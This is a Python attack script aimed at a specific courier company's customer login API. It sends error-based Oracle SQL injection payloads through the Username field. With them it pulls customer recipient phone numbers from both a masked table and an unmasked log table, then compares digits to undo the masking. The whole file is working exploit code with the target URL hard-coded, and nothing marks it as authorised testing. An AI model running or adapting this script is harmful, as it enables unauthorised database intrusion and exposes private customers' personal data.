#!/usr/bin/env python3
"""
正确的匹配验证：使用MABC + 日期
"""

import requests
import json
import time

class CorrectMatchVerifier:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def verify_with_date(self):
        """使用MABC+日期进行正确验证"""
        print("=" * 80)
        print("✅ 正确方法：MABC + 日期匹配验证")
        print("=" * 80)
        
        date = '20251010'
        test_mabcs = ['701000', '236160', '700916', '725231', '100916']
        
        match_count = 0
        not_found_count = 0
        
        for mabc in test_mabcs:
            print(f"\n{'='*80}")
            print(f"测试MABC: {mabc}, 日期: {date}")
            print(f"{'='*80}")
            
            # 脱敏表（10月10日）
            query1 = f"SELECT DIENTHOAINHAN FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND DIENTHOAINHAN IS NOT NULL AND ROWNUM=1"
            masked = self.extract_via_error(query1)
            
            # 真实表（同一天）
            query2 = f"SELECT DIENTHOAINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='{mabc}' AND NGAY='{date}' AND DIENTHOAINHAN!='0999999999' AND ROWNUM=1"
            real = self.extract_via_error(query2)
            
            if masked:
                print(f"脱敏表（{date}）: {masked}")
                masked_last4 = masked[-4:] if len(masked) >= 4 else ""
                print(f"  后4位: {masked_last4}")
            
            if real:
                print(f"真实表（{date}）: {real}")
                real_last4 = real[-4:] if len(real) >= 4 else ""
                
                if masked and masked_last4 == real_last4:
                    print(f"  ✅ 匹配！后4位都是: {masked_last4}")
                    match_count += 1
                else:
                    print(f"  ❌ 不匹配")
            else:
                print(f"真实表（{date}）: 未找到数据")
                not_found_count += 1
            
            time.sleep(3)
        
        print(f"\n{'='*80}")
        print("📊 正确匹配统计:")
        print(f"{'='*80}")
        print(f"  ✅ 匹配: {match_count}/{len(test_mabcs)}")
        print(f"  ⚠️  未找到: {not_found_count}/{len(test_mabcs)}")
        
        if not_found_count == len(test_mabcs):
            print(f"\n❌ 严重问题：所有MABC在真实表中都找不到10月10日数据！")
            print(f"💡 可能原因：")
            print(f"   1. TEMP_DATA2_LOG表没有10月10日的数据")
            print(f"   2. 数据同步延迟严重")
            print(f"   3. 10月10日数据还未同步到真实表")
    
    def check_temp_log_date_range(self):
        """检查TEMP_DATA2_LOG表的日期范围"""
        print("\n" + "=" * 80)
        print("📅 检查TEMP_DATA2_LOG表的日期范围")
        print("=" * 80)
        
        queries = [
            ("最早日期", "SELECT MIN(NGAY) FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE NGAY IS NOT NULL"),
            ("最新日期", "SELECT MAX(NGAY) FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE NGAY IS NOT NULL"),
            ("10月10日数据量", "SELECT COUNT(*) FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE NGAY='20251010'"),
            ("10月9日数据量", "SELECT COUNT(*) FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE NGAY='20251009'"),
            ("10月8日数据量", "SELECT COUNT(*) FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE NGAY='20251008'"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ {result}")
            time.sleep(2)
    
    def check_if_temp_log_has_recent_data(self):
        """检查TEMP_LOG是否有最新数据"""
        print("\n" + "=" * 80)
        print("🔍 验证TEMP_DATA2_LOG是否有最新数据")
        print("=" * 80)
        
        # 查看最新的10条记录的日期
        print("\n最新10条记录的日期:")
        for i in range(1, 11):
            query = f"SELECT NGAY FROM (SELECT NGAY, ROWNUM AS RN FROM EMS.E1E2_PH_TEMP_DATA2_LOG ORDER BY ID DESC) WHERE RN={i}"
            ngay = self.extract_via_error(query)
            if ngay:
                print(f"  {i}. {ngay}")
            time.sleep(1)
    
    def run_correct_verification(self):
        """执行正确的验证"""
        print("=" * 80)
        print("🔍 正确匹配方法验证")
        print("=" * 80)
        
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功")
        
        # 先检查日期范围
        self.check_temp_log_date_range()
        self.check_if_temp_log_has_recent_data()
        
        # 再验证匹配
        self.verify_with_date()
        
        print("\n" + "=" * 80)
        print("🎉 验证完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    verifier = CorrectMatchVerifier(target_url)
    verifier.run_correct_verification()
